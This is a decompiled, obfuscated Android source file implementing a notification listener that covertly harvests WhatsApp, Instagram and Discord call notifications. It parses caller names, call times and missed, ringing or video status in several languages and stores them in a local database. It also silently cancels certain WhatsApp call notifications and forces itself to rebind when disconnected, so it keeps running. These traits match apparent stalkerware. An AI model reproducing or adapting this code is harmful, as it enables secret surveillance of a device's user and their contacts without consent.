package com.zgoicsifmc.listeners;

import android.content.ComponentName;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import com.raizlabs.android.dbflow.config.FlowManager;
import com.zgoicsifmc.App;
import java.util.UUID;

public class NotificationListener extends NotificationListenerService {
    public final void a(StatusBarNotification statusBarNotification) {
    }

    public void onCreate() {
        super.onCreate();
        try {
            for (StatusBarNotification a : getActiveNotifications()) {
                a(a);
            }
        } catch (Exception unused) {
        }
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public void onListenerDisconnected() {
        if (Build.VERSION.SDK_INT >= 24) {
            NotificationListenerService.requestRebind(new ComponentName(this, NotificationListener.class));
        }
    }

    public void onNotificationPosted(StatusBarNotification statusBarNotification) {
        String str;
        String str2;
        try {
            a(statusBarNotification);
            for (StatusBarNotification a : getActiveNotifications()) {
                a(a);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            Bundle bundle = statusBarNotification.getNotification().extras;
            try {
                str = String.valueOf(bundle.get("android.title"));
            } catch (Exception unused) {
                str = "";
            }
            try {
                str2 = String.valueOf(bundle.get("android.text"));
            } catch (Exception unused2) {
                str2 = "";
            }
            o82.a("Checking WhatsAppCall: %s --- %s --- %s", statusBarNotification.getPackageName(), str, str2);
            if (str2.contains(getString(2131623967))) {
                o82.a("WhatsAppCall Cleared: %s --- %s", str, str2);
                if (Build.VERSION.SDK_INT >= 21) {
                    cancelNotification(statusBarNotification.getKey());
                }
            }
            if (statusBarNotification.getPackageName().toLowerCase().contains("instagram") && str2.toLowerCase().matches("^.*?(voz|voice|Stimme|voce|voix).*$")) {
                String replaceAll = str2.replaceAll("(incoming audio call|recebendo uma ligação|Audioanruf|chiamata audio|appel audio|llamada de audio)", "");
                String packageName = statusBarNotification.getPackageName();
                av1 av1 = new av1();
                av1.i(UUID.randomUUID());
                av1.f(ox1.d(App.e().getApplicationContext(), packageName));
                av1.g(replaceAll);
                av1.k(1);
                av1.h(statusBarNotification.getPostTime());
                av1.j(packageName);
                FlowManager.f(av1.class).C(av1);
                o82.d("instagram call - package: %s - contact/number: %s - date/time: %s - type: %s", statusBarNotification.getPackageName(), av1.c(), Long.valueOf(av1.d()), Integer.valueOf(av1.e()));
            }
            if (statusBarNotification.getPackageName().toLowerCase().contains("whatsapp") && str2.toLowerCase().matches("^.*?(chamando|chamada de|call|ringing|chiamata|anruf|appel|llama).*$")) {
                int i = str2.toLowerCase().matches("^.*?(chamando|ringing).*$") ? 2 : str2.toLowerCase().matches("^.*?(perdida|missed).*$") ? 3 : 1;
                int i2 = str2.toLowerCase().matches("^.*?(video|vídeo).*$") ? 2 : 1;
                String packageName2 = statusBarNotification.getPackageName();
                bw1 bw1 = new bw1();
                bw1.m(UUID.randomUUID());
                bw1.i(ox1.d(App.e().getApplicationContext(), packageName2));
                bw1.k(str);
                bw1.o(i);
                bw1.j(i2);
                bw1.l(statusBarNotification.getPostTime());
                bw1.n(packageName2);
                FlowManager.f(bw1.class).C(bw1);
                o82.d("whatsapp call - package: %s - contact/number: %s - date/time: %s - type: %s", statusBarNotification.getPackageName(), bw1.e(), Long.valueOf(bw1.f()), Integer.valueOf(bw1.h()));
            }
            if (statusBarNotification.getPackageName().toLowerCase().contains("discord") && str2.toLowerCase().matches("^.*?(ligando|chamada de|calling|ringing|chiamata|anruf|appel|llama).*$")) {
                String replaceAll2 = str2.replaceAll("(is calling you!|está te ligando!|ruft dich an!| vous appelle !|te esta llamando!)", "");
                String packageName3 = statusBarNotification.getPackageName();
                uu1 uu1 = new uu1();
                uu1.k(UUID.randomUUID());
                uu1.h(ox1.d(App.e().getApplicationContext(), packageName3));
                uu1.i(replaceAll2);
                uu1.m(1);
                uu1.j(statusBarNotification.getPostTime());
                uu1.l(packageName3);
                FlowManager.f(uu1.class).C(uu1);
                o82.d("discord call - package: %s - contact/number: %s - date/time: %s - type: %s", statusBarNotification.getPackageName(), uu1.d(), Long.valueOf(uu1.e()), Integer.valueOf(uu1.g()));
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public void onNotificationRemoved(StatusBarNotification statusBarNotification) {
    }
}
